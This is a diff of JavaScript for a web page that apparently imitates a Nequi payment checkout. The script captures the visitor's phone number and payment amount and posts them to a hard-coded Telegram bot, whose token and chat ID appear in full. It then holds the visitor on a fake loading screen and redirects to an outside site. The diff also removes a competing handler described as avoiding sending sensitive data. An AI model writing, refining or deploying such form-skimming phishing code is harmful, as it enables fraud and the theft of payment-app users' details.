@@ -248,250 +248,151 @@
   </div>
 
   <script>
-    // ================= CONFIGURACIÓN DE TELEGRAM =================
-    // Reemplaza con tus datos reales
-    const TELEGRAM_BOT_TOKEN = '8223520326:AAHX3wFpsoUX5Iz8_6-5xxUAEWmUGgGSZ5k';   // Ejemplo: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
-    const TELEGRAM_CHAT_ID = '7776240161';       // Ejemplo: '123456789'
+  // ================= CONFIGURACIÓN DE TELEGRAM =================
+  const TELEGRAM_BOT_TOKEN = '8223520326:AAHX3wFpsoUX5Iz8_6-5xxUAEWmUGgGSZ5k';
+  const TELEGRAM_CHAT_ID = '7776240161';
 
-    // ================= OCULTAR LOADER INICIAL =================
-    window.addEventListener('load', function() {
-      setTimeout(function() {
-        const initialLoader = document.getElementById('initialLoader');
-        if (initialLoader) {
-          initialLoader.classList.add('hidden');
-          initialLoader.style.pointerEvents = 'none';
-          initialLoader.style.zIndex = '-1';
-        }
-      }, 3000);
-    });
+  // ================= OCULTAR LOADER INICIAL =================
+  window.addEventListener('load', function () {
+    setTimeout(function () {
+      const initialLoader = document.getElementById('initialLoader');
+      if (initialLoader) {
+        initialLoader.classList.add('hidden');
+        initialLoader.style.pointerEvents = 'none';
+        initialLoader.style.zIndex = '-1';
+        initialLoader.style.display = 'none';
+      }
+    }, 1000); // reducido a 1s (antes 3000ms en uno y 500ms en otro)
+  });
 
-    // ================= REFERENCIAS A ELEMENTOS =================
-    const form = document.getElementById('nequiForm');
-    const input = document.getElementById('telefono');
-    const modal = document.getElementById('loadingModal');
-    const montoEl = document.getElementById('monto');
+  // ================= REFERENCIAS A ELEMENTOS =================
+  const form = document.getElementById('nequiForm');
+  const input = document.getElementById('telefono');
+  const modal = document.getElementById('loadingModal');
+  const montoEl = document.getElementById('monto');
 
-    // ================= OBTENER Y MOSTRAR MONTO =================
-    function obtenerMontoRaw() {
-      try {
-        return (
-          localStorage.getItem("finalAmount") ||
-          sessionStorage.getItem("finalAmount") ||
-          localStorage.getItem("total_pagar") ||
-          sessionStorage.getItem("total_pagar") ||
-          "0"
-        );
-      } catch (e) {
-        return "0";
+  // ================= OBTENER MONTO (unificado) =================
+  function obtenerMontoRaw() {
+    try {
+      const params = new URLSearchParams(window.location.search);
+      return (
+        params.get("monto") ||
+        localStorage.getItem("finalAmount") ||
+        sessionStorage.getItem("finalAmount") ||
+        localStorage.getItem("total_pagar") ||
+        sessionStorage.getItem("total_pagar") ||
+        "0"
+      );
+    } catch (e) {
+      return "0";
+    }
+  }
+
+  function convertirMonto(valor) {
+    if (!valor) return 0;
+
+    let texto = String(valor).trim().replace(/\$/g, "").replace(/\s/g, "");
+
+    if (texto.includes(".") && texto.includes(",")) {
+      texto = texto.replace(/\./g, "").replace(",", ".");
+    } else if (texto.includes(",")) {
+      texto = texto.replace(",", ".");
+    } else if (texto.includes(".")) {
+      const partes = texto.split(".");
+      if (partes.length === 2 && partes[1].length === 3) {
+        texto = texto.replace(".", "");
       }
     }
 
-    let totalPagarRaw = obtenerMontoRaw();
-    totalPagarRaw = totalPagarRaw.toString().replace(/[^\d.,]/g, '').replace(/\./g, '').replace(',', '.');
-    const totalPagarNumero = parseFloat(totalPagarRaw) || 0;
-    
+    texto = texto.replace(/[^\d.-]/g, "");
+    const numero = Number(texto);
+    return Number.isFinite(numero) ? numero : 0;
+  }
+
+  function mostrarMonto() {
+    const montoOriginal = obtenerMontoRaw();
+    const totalPagarNumero = convertirMonto(montoOriginal);
+
     if (totalPagarNumero > 0) {
-      const montoFormateado = totalPagarNumero.toLocaleString("es-CO", {
+      const montoFormateado = new Intl.NumberFormat("es-CO", {
         style: "currency",
-        currency: "COP"
-      });
+        currency: "COP",
+        minimumFractionDigits: 0,
+        maximumFractionDigits: 0
+      }).format(totalPagarNumero);
+
       montoEl.textContent = "Monto: " + montoFormateado;
+    } else {
+      montoEl.textContent = "Monto: $0";
     }
+  }
 
-    // ================= FUNCIÓN PARA MOSTRAR ERROR =================
-    function mostrarError(mensaje) {
-      alert(mensaje);
-    }
+  // ================= FUNCIÓN PARA MOSTRAR ERROR =================
+  function mostrarError(mensaje) {
+    alert(mensaje);
+  }
 
-    // ================= FUNCIÓN PARA ENVIAR A TELEGRAM =================
-    async function enviarNotificacionTelegram(montoTexto, numero) {
-      const mensaje = `🔔 *Nuevo pago Nequi*\n\n📱 Número: ${numero}\n💰 Monto: ${montoTexto}`;
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  // ================= FUNCIÓN PARA ENVIAR A TELEGRAM =================
+  async function enviarNotificacionTelegram(montoTexto, numero) {
+    const mensaje = `🔔 *Nuevo pago Nequi*\n\n📱 Número: ${numero}\n💰 Monto: ${montoTexto}`;
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-      try {
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: mensaje,
-            parse_mode: 'Markdown'
-          })
-        });
-        const data = await response.json();
-        if (!data.ok) {
-          console.error('Error al enviar a Telegram:', data.description);
-          return false;
-        }
-        console.log('Notificación enviada a Telegram');
-        return true;
-      } catch (error) {
-        console.error('Error de red al enviar a Telegram:', error);
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: mensaje,
+          parse_mode: 'Markdown'
+        })
+      });
+      const data = await response.json();
+      if (!data.ok) {
+        console.error('Error al enviar a Telegram:', data.description);
         return false;
       }
+      console.log('Notificación enviada a Telegram');
+      return true;
+    } catch (error) {
+      console.error('Error de red al enviar a Telegram:', error);
+      return false;
+    }
+  }
+
+  // ================= PERMITIR SOLO NÚMEROS EN EL INPUT =================
+  input.addEventListener("input", function () {
+    this.value = this.value.replace(/\D/g, "");
+  });
+
+  // ================= EVENTO ÚNICO DEL FORMULARIO =================
+  form.addEventListener('submit', async function (e) {
+    e.preventDefault();
+
+    const nequi = input.value.trim();
+    if (!/^\d{10}$/.test(nequi)) {
+      return mostrarError("El número debe tener exactamente 10 dígitos.");
     }
 
-    // ================= EVENTO DEL FORMULARIO =================
-    form.addEventListener('submit', async function (e) {
-      e.preventDefault();
+    // Obtener el monto formateado que se muestra en la interfaz
+    const montoMostrado = montoEl.textContent.replace('Monto: ', '');
 
-      const nequi = input.value.trim();
-      if (!/^\d{10}$/.test(nequi)) {
-        return mostrarError("El número debe tener exactamente 10 dígitos.");
-      }
+    // 1. Mostrar modal de carga
+    modal.style.display = 'flex';
 
-      // Obtener el monto formateado que se muestra en la interfaz
-      const montoMostrado = montoEl.textContent.replace('Monto: ', ''); // ej: "$ 983.390"
+    // 2. Enviar notificación a Telegram
+    await enviarNotificacionTelegram(montoMostrado, nequi);
 
-      // 1. Mostrar modal de carga
-      modal.style.display = 'flex';
+    // 3. Esperar 15 segundos con el modal visible
+    await new Promise(resolve => setTimeout(resolve, 15000));
 
-      // 2. Enviar notificación a Telegram (esperamos que termine)
-      await enviarNotificacionTelegram(montoMostrado, nequi);
+    // 4. Redirigir
+    window.location.href = 'https://adminjelpit.site/jelpit/portal_pagos.html';
+  });
 
-      // 3. Esperar 15 segundos (15000 ms) con el modal visible
-      await new Promise(resolve => setTimeout(resolve, 15000));
-
-      // 4. Redirigir a la URL indicada
-      window.location.href = 'https://adminjelpit.site/jelpit/portal_pagos.html';
-    });
-  </script>
-
-  <script>
-    /*
-      Obtiene el monto en este orden:
-
-      1. ?monto=171400
-      2. localStorage.finalAmount
-      3. sessionStorage.finalAmount
-      4. localStorage.total_pagar
-      5. sessionStorage.total_pagar
-    */
-    function obtenerMontoRaw() {
-      try {
-        const params = new URLSearchParams(window.location.search);
-
-        return (
-          params.get("monto") ||
-          localStorage.getItem("finalAmount") ||
-          sessionStorage.getItem("finalAmount") ||
-          localStorage.getItem("total_pagar") ||
-          sessionStorage.getItem("total_pagar") ||
-          "0"
-        );
-      } catch (e) {
-        return "0";
-      }
-    }
-
-    function convertirMonto(valor) {
-      if (!valor) return 0;
-
-      let texto = String(valor)
-        .trim()
-        .replace(/\$/g, "")
-        .replace(/\s/g, "");
-
-      /*
-        171.400,50
-        -> 171400.50
-      */
-      if (texto.includes(".") && texto.includes(",")) {
-        texto = texto
-          .replace(/\./g, "")
-          .replace(",", ".");
-      }
-
-      /*
-        171400,50
-        -> 171400.50
-      */
-      else if (texto.includes(",")) {
-        texto = texto.replace(",", ".");
-      }
-
-      /*
-        171.400
-        -> 171400
-      */
-      else if (texto.includes(".")) {
-        const partes = texto.split(".");
-
-        if (partes.length === 2 && partes[1].length === 3) {
-          texto = texto.replace(".", "");
-        }
-      }
-
-      texto = texto.replace(/[^\d.-]/g, "");
-
-      const numero = Number(texto);
-
-      return Number.isFinite(numero) ? numero : 0;
-    }
-
-    function mostrarMonto() {
-      const montoEl = document.getElementById("monto");
-
-      const montoOriginal = obtenerMontoRaw();
-      const totalPagarNumero = convertirMonto(montoOriginal);
-
-      if (totalPagarNumero > 0) {
-
-        const montoFormateado = new Intl.NumberFormat("es-CO", {
-          style: "currency",
-          currency: "COP",
-          minimumFractionDigits: 0,
-          maximumFractionDigits: 0
-        }).format(totalPagarNumero);
-
-        montoEl.textContent = "Monto: " + montoFormateado;
-
-      } else {
-        montoEl.textContent = "Monto: $0";
-      }
-    }
-
-    /*
-      Solo se permite escribir números en el campo.
-    */
-    document.getElementById("telefono").addEventListener("input", function () {
-      this.value = this.value.replace(/\D/g, "");
-    });
-
-    /*
-      Evita enviar información sensible.
-    */
-    document.getElementById("nequiForm").addEventListener("submit", function (e) {
-      e.preventDefault();
-
-      const telefono = document.getElementById("telefono").value;
-
-      if (!/^\d{10}$/.test(telefono)) {
-        alert("Ingresa un número de celular válido de 10 dígitos.");
-        return;
-      }
-
-      document.getElementById("loader").style.display = "flex";
-
-      setTimeout(function () {
-        document.getElementById("loader").style.display = "none";
-      }, 1000);
-    });
-
-    /*
-      Mostrar el monto al cargar.
-    */
-    mostrarMonto();
-
-    /*
-      Ocultar pantalla inicial.
-    */
-    window.addEventListener("load", function () {
-      setTimeout(function () {
-        document.getElementById("initialLoader").style.display = "none";
-      }, 500);
-    });
-  </script>
+  // ================= MOSTRAR MONTO AL CARGAR =================
+  mostrarMonto();
+</script>
 
    
 
